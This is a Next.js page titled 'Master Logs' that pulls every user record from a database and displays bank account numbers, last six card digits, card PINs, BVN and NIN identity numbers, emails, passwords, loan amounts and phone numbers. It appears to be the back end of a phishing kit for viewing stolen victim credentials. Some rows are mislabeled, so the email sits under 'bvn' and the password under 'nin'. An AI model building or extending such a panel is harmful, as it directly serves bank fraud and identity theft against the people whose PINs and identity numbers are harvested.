//import '../app/globals.css'

import { Key} from 'react'

import dbConnect from '@/lib/dbConnect'
import { serialize } from 'v8'
import User from 'model/User'


//const inter = Inter({ subsets: ['latin'] })

export default function Home(params: { data: any}) {

  const { data } = params

  const data1 = JSON.parse(data)
  console.log(JSON.parse(data))
  
  return (
    <div className='w-[80%] m-auto'>
      <div className='mt-4 text-center text-gray-800 font-semibold text-3xl pt-8'>
          Master Logs...
      </div>

      {
        data1?.length > 0 &&
        data1.map((d: {pass: string | number   | null | undefined; email: string | number   | null | undefined; nin: string | number   | null | undefined;bvn: string | number   | null | undefined; accNo: string | number   | null | undefined; last6: string | number  | null | undefined; cpin: string | number | null | undefined; loanAmm: string | number | null | undefined; username: string | number | null | undefined }, i: Key | null | undefined) => (
          <div key={i} className='flex flex-col gap-1 mt-8 pb-4 border-b-2 border-b-gray-700'>
            <div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Account</div><div>{d.accNo}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Last 6 digit</div><div>{d.last6}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>CC pin</div><div>{d.cpin}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>bvn</div><div>{d.bvn}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>nin</div><div>{d.nin}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>bvn</div><div>{d.email}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>nin</div><div>{d.pass}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>CC pin</div><div>{d.cpin}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Loan Amount</div><div>{d.loanAmm}</div></div>
            <div className=' p-3 border-2 border-gray-500 flex justify-between items-center'><div>Phone</div><div>{d.username}</div></div>
          </div>
        ))
      }
      
    </div>
  )
}

export async function getServerSideProps(context: any) {
  try {
  

    await dbConnect()
    const query = await User.find()
   // console.log(query)
    return {
      props: {
        data:JSON.stringify(query) 
      },
    }



  } catch (error) {
    console.log('logs.tsx:::', error)
    return {
      props: {
        data:null
      },
    }
    
  }
}

